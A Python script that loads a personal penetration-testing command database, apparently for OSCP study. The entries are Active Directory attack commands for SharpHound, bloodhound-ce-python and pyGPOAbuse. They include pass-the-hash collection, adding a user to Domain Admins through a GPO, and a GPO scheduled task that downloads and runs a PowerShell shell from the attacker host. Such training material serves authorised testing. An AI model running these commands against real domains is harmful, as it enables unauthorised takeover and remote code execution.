import sqlite3, os

DB_PATH = os.path.expanduser("~/.oscp_commands.db")

entries = [
    # SharpHound
    ("sharphound","Collect all AD data using current user context (run from domain-joined host)",".\\SharpHound.exe -c All","ad","bloodhound,active-directory,enumeration,sharphound,collection"),
    ("sharphound","Collect all AD data with explicit domain and DC specified",".\\SharpHound.exe -c All --domain DOMAIN.LOCAL --domaincontroller <DC_IP>","ad","bloodhound,active-directory,enumeration,sharphound,collection"),
    ("sharphound","Collect all AD data using explicit LDAP credentials (use when running as low-priv domain user)",".\\SharpHound.exe -c All --domain DOMAIN.LOCAL --domaincontroller <DC_IP> --ldapusername USERNAME --ldappassword PASSWORD","ad","bloodhound,active-directory,enumeration,sharphound,collection"),
    ("sharphound","Collect only ACL data (fastest for finding DACL abuse paths)",".\\SharpHound.exe -c ACL --domain DOMAIN.LOCAL --domaincontroller <DC_IP>","ad","bloodhound,active-directory,acl,dacl,sharphound,collection"),
    ("sharphound","Collect only Session data (find where users are logged in)",".\\SharpHound.exe -c Session --domain DOMAIN.LOCAL --domaincontroller <DC_IP>","ad","bloodhound,active-directory,sessions,sharphound,collection"),
    ("sharphound","Collect with stealth options -- reduces network noise",".\\SharpHound.exe -c All --stealth","ad","bloodhound,active-directory,stealth,sharphound,collection"),
    ("sharphound","Exclude domain controllers from session enumeration (reduces noise)",".\\SharpHound.exe -c All --ExcludeDCs","ad","bloodhound,active-directory,enumeration,sharphound,collection"),
    ("sharphound","Output zip to specific directory",".\\SharpHound.exe -c All --outputdirectory C:\\Windows\\Temp","ad","bloodhound,active-directory,enumeration,sharphound,collection"),

    # bloodhound-ce-python
    ("bloodhound-ce-python","Collect all AD data for BloodHound CE from Kali using domain credentials","bloodhound-ce-python -u USERNAME -p 'PASSWORD' -d DOMAIN.LOCAL -ns <DC_IP> -c All","ad","bloodhound,active-directory,enumeration,collection,kali,bloodhound-ce"),
    ("bloodhound-ce-python","Collect all AD data using NTLM hash instead of password","bloodhound-ce-python -u USERNAME --hashes :NTHASH -d DOMAIN.LOCAL -ns <DC_IP> -c All","ad","bloodhound,active-directory,enumeration,pass-the-hash,kali,bloodhound-ce"),
    ("bloodhound-ce-python","Collect only ACL data from Kali (fast, targets DACL abuse paths)","bloodhound-ce-python -u USERNAME -p 'PASSWORD' -d DOMAIN.LOCAL -ns <DC_IP> -c ACL","ad","bloodhound,active-directory,acl,dacl,kali,bloodhound-ce"),
    ("bloodhound-ce-python","Collect with Kerberos auth (use when NTLM is blocked)","bloodhound-ce-python -u USERNAME -p 'PASSWORD' -d DOMAIN.LOCAL -ns <DC_IP> -c All -k","ad","bloodhound,active-directory,kerberos,enumeration,kali,bloodhound-ce"),
    ("bloodhound-ce-python","Collect and output to specific directory","bloodhound-ce-python -u USERNAME -p 'PASSWORD' -d DOMAIN.LOCAL -ns <DC_IP> -c All --zip -o /tmp/bh","ad","bloodhound,active-directory,enumeration,kali,bloodhound-ce"),

    # pyGPOAbuse
    ("pygpoabuse","Add authenticated user as local admin on all GPO-affected machines (user-as-admin runs scheduled task as SYSTEM)","python3 pygpoabuse.py DOMAIN/USERNAME:'PASSWORD' -dc-ip <DC_IP> -gpo-id '<GPO_GUID>' -user-as-admin -f","ad","gpo-abuse,active-directory,dacl-abuse,domain-admin,lateral-movement,pygpoabuse"),
    ("pygpoabuse","Add user to Domain Admins via GPO scheduled task command execution","python3 pygpoabuse.py DOMAIN/USERNAME:'PASSWORD' -dc-ip <DC_IP> -gpo-id '<GPO_GUID>' -command \"net group \\\"Domain Admins\\\" USERNAME /add /domain\" -f","ad","gpo-abuse,active-directory,domain-admin,scheduled-task,dacl-abuse,pygpoabuse"),
    ("pygpoabuse","Execute custom PowerShell command via GPO scheduled task","python3 pygpoabuse.py DOMAIN/USERNAME:'PASSWORD' -dc-ip <DC_IP> -gpo-id '<GPO_GUID>' -powershell -command 'IEX(IWR http://KALI_IP/shell.ps1 -UseBasicParsing)' -f","ad","gpo-abuse,active-directory,powershell,scheduled-task,dacl-abuse,pygpoabuse"),
    ("pygpoabuse","Add a new local admin user via GPO default command (adds john:H4x00r123..)","python3 pygpoabuse.py DOMAIN/USERNAME:'PASSWORD' -dc-ip <DC_IP> -gpo-id '<GPO_GUID>' -f","ad","gpo-abuse,active-directory,local-admin,scheduled-task,pygpoabuse"),
    ("pygpoabuse","Cleanup -- remove the created scheduled task from the GPO","python3 pygpoabuse.py DOMAIN/USERNAME:'PASSWORD' -dc-ip <DC_IP> -gpo-id '<GPO_GUID>' --cleanup","ad","gpo-abuse,active-directory,cleanup,pygpoabuse"),
    ("pygpoabuse","Find GPO GUID from BloodHound -- look in Distinguished Name field of GPO node -- format: CN=<GUID>,CN=POLICIES,CN=SYSTEM,DC=...","","ad","gpo-abuse,active-directory,bloodhound,pygpoabuse,tip"),
    ("pygpoabuse","Find GPO GUID from Seatbelt LocalGPOs output -- look for GPOName field with the GUID value","","ad","gpo-abuse,active-directory,seatbelt,pygpoabuse,tip"),

    # GPO verification / support commands
    ("nxc","Verify Domain Admins group membership via LDAP after GPO abuse","nxc ldap <DC_IP> -u USERNAME -p 'PASSWORD' --groups \"Domain Admins\"","ad","active-directory,domain-admins,verification,ldap,nxc,gpo-abuse"),
    ("powershell","Force GPO refresh on current machine to speed up scheduled task execution after pyGPOAbuse","gpupdate /force","ad","gpo-abuse,active-directory,gpupdate,gpo-refresh,windows"),
]

conn = sqlite3.connect(DB_PATH)
c = conn.cursor()
for e in entries:
    c.execute("INSERT INTO commands (tool,description,command,category,tags) VALUES (?,?,?,?,?)", e)
conn.commit()
conn.close()
print(f"[+] Inserted {len(entries)} entries into {DB_PATH}")
